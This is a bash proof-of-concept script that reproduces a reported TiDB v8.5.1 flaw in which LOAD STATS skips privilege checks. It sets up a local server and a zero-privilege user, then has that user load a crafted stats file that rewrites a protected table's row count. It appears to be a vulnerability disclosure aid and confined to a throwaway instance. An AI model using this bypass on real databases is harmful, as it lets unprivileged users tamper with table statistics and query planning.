#!/usr/bin/env bash
# ============================================================================
# FINDING-01 — TiDB `LOAD STATS` performs no privilege check.
# Self-contained reproduction. Exits 0 ONLY if the vulnerability reproduces.
#
# Requirements: linux x86_64, curl, tar, a mysql/mariadb client, ~1GB free disk.
# Nothing else. No Docker, no cluster, no root.
# ============================================================================
set -u
WORK=${WORK:-/tmp/tidb-finding01}
PORT=${PORT:-4199}; STATUS=${STATUS:-10199}
URL=https://tiup-mirrors.pingcap.com/tidb-v8.5.1-linux-amd64.tar.gz
mkdir -p "$WORK"; cd "$WORK"

echo "== [1/6] fetch official TiDB v8.5.1 binary =="
if [ ! -x "$WORK/tidb-server" ]; then
  curl -fsSL "$URL" -o t.tgz || { echo "download failed"; exit 2; }
  tar xzf t.tgz && rm -f t.tgz
fi
chmod +x "$WORK/tidb-server"
"$WORK/tidb-server" -V | head -3 | sed 's/^/  /'

echo "== [2/6] start standalone TiDB (mock storage, no cluster) =="
rm -rf "$WORK/data"; mkdir -p "$WORK/data"
"$WORK/tidb-server" --store=unistore --path="$WORK/data" \
  -P $PORT --status=$STATUS --host=127.0.0.1 > "$WORK/tidb.log" 2>&1 &
TPID=$!
for i in $(seq 1 60); do
  mysql -h127.0.0.1 -P$PORT -uroot -e 'select 1' >/dev/null 2>&1 && break; sleep 1
done
Q(){ mysql -h127.0.0.1 -P$PORT -u"$1" -B -N --connect-timeout=5 -e "$2" 2>&1 \
  | grep -viE 'ssl-verify-server-cert|insecure passwordless'; }

echo "== [3/6] create victim table + a user with ZERO privileges =="
Q root "DROP DATABASE IF EXISTS victimdb; CREATE DATABASE victimdb;
CREATE TABLE victimdb.secret_t(id INT PRIMARY KEY, v VARCHAR(32));
INSERT INTO victimdb.secret_t VALUES (1,'a'),(2,'b');
DROP USER IF EXISTS 'lowpriv'@'%'; CREATE USER 'lowpriv'@'%';
ANALYZE TABLE victimdb.secret_t;" >/dev/null
echo "  grants: $(Q root "SHOW GRANTS FOR 'lowpriv'@'%'")"

echo "== [4/6] confirm lowpriv is powerless (all must be ERROR 1142) =="
for stmt in "SELECT * FROM victimdb.secret_t" \
            "ANALYZE TABLE victimdb.secret_t" \
            "LOCK STATS victimdb.secret_t" \
            "UNLOCK STATS victimdb.secret_t"; do
  printf '  %-38s -> %s\n' "$stmt" "$(Q lowpriv "$stmt" | grep -o 'ERROR [0-9]*' | head -1)"
done

echo "== [5/6] hand-craft a stats payload (no dump, no privileged access) =="
cat > "$WORK/evil.json" <<'JSON'
{"database_name":"victimdb","table_name":"secret_t","columns":{},"indices":{},
"count":777000777,"modify_count":0,"version":1}
JSON
chmod 644 "$WORK/evil.json"
BEFORE=$(Q root "SHOW STATS_META WHERE db_name='victimdb' AND table_name='secret_t'" | awk '{print $6}')
OUT=$(Q lowpriv "LOAD STATS '$WORK/evil.json'")
AFTER=$(Q root "SHOW STATS_META WHERE db_name='victimdb' AND table_name='secret_t'" | awk '{print $6}')
echo "  LOAD STATS as lowpriv -> '${OUT:-<no error>}'"
echo "  Row_count: $BEFORE -> $AFTER"

echo "== [6/6] result =="
RC=1
if [ "$AFTER" = "777000777" ] && [ "$BEFORE" != "777000777" ]; then
  echo "  ✅ REPRODUCED: a USAGE-only user rewrote statistics for a table it cannot SELECT."
  RC=0
else
  echo "  ❌ NOT reproduced (before=$BEFORE after=$AFTER)"
fi
Q root "DROP DATABASE IF EXISTS victimdb; DROP USER IF EXISTS 'lowpriv'@'%';" >/dev/null 2>&1
kill $TPID 2>/dev/null; wait $TPID 2>/dev/null
echo "  (TiDB stopped; working dir $WORK)"
exit $RC
